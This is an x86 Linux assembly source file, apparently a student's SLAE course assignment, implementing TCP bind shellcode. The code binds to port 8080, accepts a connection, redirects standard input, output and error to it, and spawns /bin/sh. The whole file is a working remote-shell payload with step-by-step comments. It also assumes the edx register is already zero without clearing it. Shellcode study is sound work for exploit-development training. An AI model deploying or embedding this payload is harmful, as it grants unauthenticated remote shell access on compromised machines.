; SLAE - Assignment 1: TCP Bind Shellcode
; Author: Jesse Nelson
; Student ID: SLAE - 1087
; Purpose: Create a TCP bind shell in assembly in which the port can be easily configured

global _start

section .text

_start:

	;socketcall()
	;eax

	;socket(AF_INET, SOCK_STREAM, 0)
	;ebx     ecx       ebx        esi

	;
	; create a socket
	; socket(2, 1, 0)
	;

	xor eax, eax	; clean eax
	xor ebx, ebx	; clean ebx

	mov al, 0x66	; socketcall() syscall #

	xor esi, esi	; clean esi for IPPROTO = 0

	mov bl, 0x1	; socket() = 1

	push esi		; IPPROTO = 0
	push ebx		; SOCK_STREAM = 1 -- 0x1 from before
	push byte 0x2		; AF_INET = 2

	mov ecx, esp		; save pointer in ecx -- points to socket() args
	int 0x80		; run socket()

	; need to store sockfd somewhere as eax will be overwritten
	; store sockfd into esi

	xchg esi, eax	; sockfd now stored into esi (0x3)

	;
	; bind to socket
	; bind(sockfd, 
	; sa_family=AF_INET, 
	; sin_port=htons(8080),
	; sin_addr=inet_addr("0.0.0.0")},
	; 16)
	;

	inc ebx			; ebx was 0x1, now 0x2 it's for bind() syscall #

	push edx		; INADDR_ANY (0.0.0.0)
	push word 0x901f	; port = 8080 - network byte order
	push bx			; AF_INET = 2

	mov ecx, esp		; save pointer in ecx -- points to struct

	push byte 0x10		; sizeof
	push ecx		; pointer
	push esi		; sockfd / 0x3

	mov ecx, esp		; save pointer in ecx -- points to bind() args

	mov al, 0x66		; socketcall() syscall # 

	int 0x80		; run bind()

	;
	; listen for connections
	; listen(sockfd, 2)
	;

	push ebx		; queueLimit = 2 -- 0x2 from before
	push esi		; sockfd / 0x3

	mov ecx, esp		; save pointer in ecx -- points to listen() args

	inc ebx			; add 2 to ebx to equal 0x4 for listen() syscall #
	inc ebx			; ebx = 0x4
	
	push 0x66		; changed this from mov al, 0x66 and it works
	pop eax			; socketcall() syscall #

	int 0x80		; run listen()

	;
	; accept incoming connections
	; accept(int sockfd, NULL, NULL)
	;

	; edx is currently 0x0 so we can push that onto the stack for the NULL values

	push edx	; NULL
	push edx	; NULL
	push esi	; sockfd / 0x3

	mov ecx, esp	; save pointer in ecx -- points to accept() args

	inc ebx 	; add 1 to ebx to make it 0x5 for the accept() syscall # 

	mov al, 0x66	; socketcall() syscall #

	int 0x80	; run accept()

	;
	; input, output, and error redirection
	; dup2
	; dup2(5, (0,1,2))
	;

	xchg ebx, eax	; place clientfd / 0x5 in eax

	xor ecx, ecx	; clear ecx to prep for counter

	mov cl, 0x2	; store 0x2 into ecx for counter

duploop:
	mov al, 0x3f	; dup2() syscall #
	int 0x80	; run dup2
	dec ecx		; dec ecx down
	jns duploop
	
	;
	; execve("/bin//sh", NULL, NULL)  
	;	

	mov al, 0x0b		; execve() syscall #

	push edx		; NULL 
	push 0x68732f2f     	; hs//  - two slashes are added to make the total value 8 bytes
	push 0x6e69622f     	; nib/  
      
	mov ebx, esp       	; EBX points to "/bin//sh"  
	mov ecx, edx        	; ECX = NULL    
	
    	int 0x80		; run execve() GET DAT SHELL BOI
